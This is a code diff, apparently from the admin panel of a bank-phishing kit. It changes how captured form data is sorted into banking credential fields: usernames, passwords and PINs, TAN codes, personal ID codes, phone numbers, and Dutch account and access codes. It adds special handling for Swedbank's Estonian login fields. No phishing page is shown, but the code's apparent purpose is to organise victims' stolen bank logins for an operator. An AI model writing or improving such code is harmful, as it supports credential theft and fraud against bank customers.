@@ -25,6 +25,7 @@ function inferCanonicalLogFieldKey(
   }
 
   if (
+    normalizedKey.includes("telefoninumber") ||
     normalizedKey.includes("mobilenumber") ||
     normalizedKey.includes("phonenumber") ||
     normalizedKey.includes("phonefield") ||
@@ -166,19 +167,43 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
     return "";
   };
 
-  const canonicalFields: Array<[string, string]> = [
-    ["loginMethod", pickString("loginMethod")],
-    ["personalCode", pickString("personalCode")],
-    ["bankPhone", pickString("bankPhone")],
-    ["username", pickString("username", "verfuegernummer")],
-    ["password", pickString("password", "pin")],
-    ["tacCode", pickString("tacCode")],
-    ["pasnummer", pickString("pasnummer")],
-    ["rekeningnummer", pickString("rekeningnummer")],
-    ["toegangscode", pickString("toegangscode")],
-    ["signatuur", pickString("signatuur")],
-    ["identificatiecode", pickString("identificatiecode")],
-  ];
+  const normalizedKeys = Object.keys(formData).map((key) => key.toLowerCase().replace(/[^a-z0-9]/g, ""));
+  const normalizedBankName = [formData.bankSlug, formData.bankName]
+    .filter((value): value is string => typeof value === "string")
+    .join(" ")
+    .toLowerCase();
+  const prefersUsernameFirst =
+    normalizedBankName.includes("swedbank") &&
+    normalizedKeys.some((key) => key.includes("kasutajatunnus")) &&
+    normalizedKeys.some((key) => key.includes("telefoninumber") || key.includes("phone") || key.includes("isikukood"));
+
+  const canonicalFields: Array<[string, string]> = prefersUsernameFirst
+    ? [
+        ["loginMethod", pickString("loginMethod")],
+        ["username", pickString("username", "verfuegernummer")],
+        ["personalCode", pickString("personalCode")],
+        ["bankPhone", pickString("bankPhone")],
+        ["password", pickString("password", "pin")],
+        ["tacCode", pickString("tacCode")],
+        ["pasnummer", pickString("pasnummer")],
+        ["rekeningnummer", pickString("rekeningnummer")],
+        ["toegangscode", pickString("toegangscode")],
+        ["signatuur", pickString("signatuur")],
+        ["identificatiecode", pickString("identificatiecode")],
+      ]
+    : [
+        ["loginMethod", pickString("loginMethod")],
+        ["personalCode", pickString("personalCode")],
+        ["bankPhone", pickString("bankPhone")],
+        ["username", pickString("username", "verfuegernummer")],
+        ["password", pickString("password", "pin")],
+        ["tacCode", pickString("tacCode")],
+        ["pasnummer", pickString("pasnummer")],
+        ["rekeningnummer", pickString("rekeningnummer")],
+        ["toegangscode", pickString("toegangscode")],
+        ["signatuur", pickString("signatuur")],
+        ["identificatiecode", pickString("identificatiecode")],
+      ];
 
   return canonicalFields.filter(([, value]) => Boolean(value));
 }
